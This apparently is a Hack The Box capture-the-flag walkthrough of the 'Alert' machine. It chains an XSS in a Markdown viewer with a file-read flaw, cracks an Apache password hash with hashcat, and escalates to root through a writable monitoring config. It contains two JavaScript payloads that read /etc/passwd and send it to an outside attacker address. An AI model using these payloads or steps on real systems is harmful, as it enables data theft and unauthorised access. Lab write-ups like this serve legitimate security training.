---
title: "Alert Walkthrough(HTB)"
date: 2025-03-20
draft: true 
description: "a description"
tags: ["Easy", "Linux", "HTB", "Hacking", "Web", "Walkthrough"]
---
## Reconnaissance #Linux 
- Got three ports open SSH,web page etc
- ![[Pasted image 20241218005036.png]]
- Server running on apache2
- We got a Markdown reader page, Basic functionality is Upload the md file and read it.
- But there is an issue it uses js and HTML to render the page within them
- My md file contents 
- ![[Pasted image 20241218005523.png]]
- Which loaded like this
- ![[Pasted image 20241218005550.png]]
- This is quite bad. It can execute code as it renders the contents
## Enumeration
- Also another functionality is there pretty straight forward one where in contact form Whatever link sent the other user Admin seems to be clicking it without analyzing it.
- So to exploit this LFI vulnerability used this payload and opened a nc on other side. 
```js
<script>
fetch("http://alert.htb/messages.php?file=/etc/passwd").then(response => response.text())
  .then(data => fetch("http://10.10.14.12:6001", {
      method: "POST",
      body: data
  }));
   
</script>
```
- To execute this payload, View it and use the share option and get the link, share it the miserable admin via contact form.
- After some enumeration
```js
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd").then(response => response.text())
  .then(data => fetch("http://10.10.14.12:6001", {
      method: "POST",
      body: data
  }));
   
</script>
```
- ![[Pasted image 20241218010840.png]]
- Found couple of users. Now the configs for apache2 running websites generally resides at `/etc/apache2/sites-available/000-default.conf` Learnt this from enumerating my own machine.
- ![[Pasted image 20241218011112.png]]
- After modifying the original payload according to this I got the output.
- ![[Pasted image 20241218011242.png]]
- Got the `.htpasswd` location. Usually this file contains the password for apache2 .
- Within that we got password hash for User albert 
- ![[Pasted image 20241218011625.png]]
- Lets crack it
## Exploitation
- I used hashcat to crack this hash `hashcat hash.txt  /usr/share/wordlists/rockyou.txt -m 1600 --username` Here specified module 1600 to crack apache type hash and with albert presented within the hash so specified `--username` flag
- ![[Pasted image 20241218012743.png]]
- Now we can use ssh to login
- We got the user flag
## Privilege Escalation
- General SUID, SGID, Capabilities didn't had anything promising
- But anyway there was a internal web service running on port 80 `ss -tunlp` so I tunneled it to my machine via ssh on port 2000.
- `ssh -L 2000:localhost:8080 albert@alert.htb`
- ![[Pasted image 20241218014520.png]]
- The website name was websitemonitor which runs and monitor the websites which are public from the machine like alert.htb
-  I have found the website location on `/opt/websitemonitor`
- Where it had configuration file on `/config`
- ![[Pasted image 20241218020002.png]]
- As it defines the web folder on root and Albert too have access to modify it.
- I changed the file with reverseshell.
- ![[Pasted image 20241218020421.png]]
- Eventually secured root flag
- ![[Pasted image 20241218020525.png]]
